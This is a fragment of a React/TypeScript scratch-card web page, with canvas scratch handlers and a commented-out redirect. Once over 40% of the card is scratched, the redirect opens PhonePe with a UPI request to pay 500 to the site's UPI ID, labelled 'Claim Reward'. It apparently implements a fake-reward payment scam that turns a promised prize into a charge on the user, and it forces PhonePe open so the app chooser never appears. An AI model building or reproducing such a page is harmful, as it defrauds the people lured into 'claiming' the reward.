...
export default function ScratchCardPage() {
  ...
  useEffect(() => {
    ...
    const scratch = (e: MouseEvent | TouchEvent) => {
      ...
      if (scratchPercentage > 40 && !showClaimButton) {
    ...
    const handleMouseDown = (e: MouseEvent) => { isDrawing.current = true; scratch(e); };
    const handleMouseMove = (e: MouseEvent) => { if (isDrawing.current) scratch(e); };
    const handleMouseUp = () => { isDrawing.current = false; };
    const handleTouchStart = (e: TouchEvent) => { isDrawing.current = true; scratch(e as any); };
    const handleTouchMove = (e: TouchEvent) => { if (isDrawing.current) scratch(e as any); };
...
//   // Open PhonePe only (no other UPI apps)
//   const redirectToPhonePe = () => {
//     try {
//       const amount = '500';
...
//       if (isAndroid) {
//         // Android: Direct Intent to PhonePe app only (prevents app chooser)
//         const androidIntent = `intent://upi/pay?pa=${UPI_ID}&pn=${encodeURIComponent(APP_NAME)}&tn=${encodeURIComponent('Claim Reward')}&am=${amount}#Intent;scheme=upi;package=com.phonepe.app;end`;
//         window.location.href = androidIntent;
//       } else if (isIOS) {
//         // iOS: Use standard UPI scheme (PhonePe opens if installed)
//         const upiLink = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(APP_NAME)}&tn=${encodeURIComponent('Claim Reward')}&am=${amount}`;
//         window.location.href = upiLink;
//       }
//     } catch (error) {
...
//       if (scratchPercentage > 40 && !hasRedirected.current) {
//         hasRedirected.current = true;
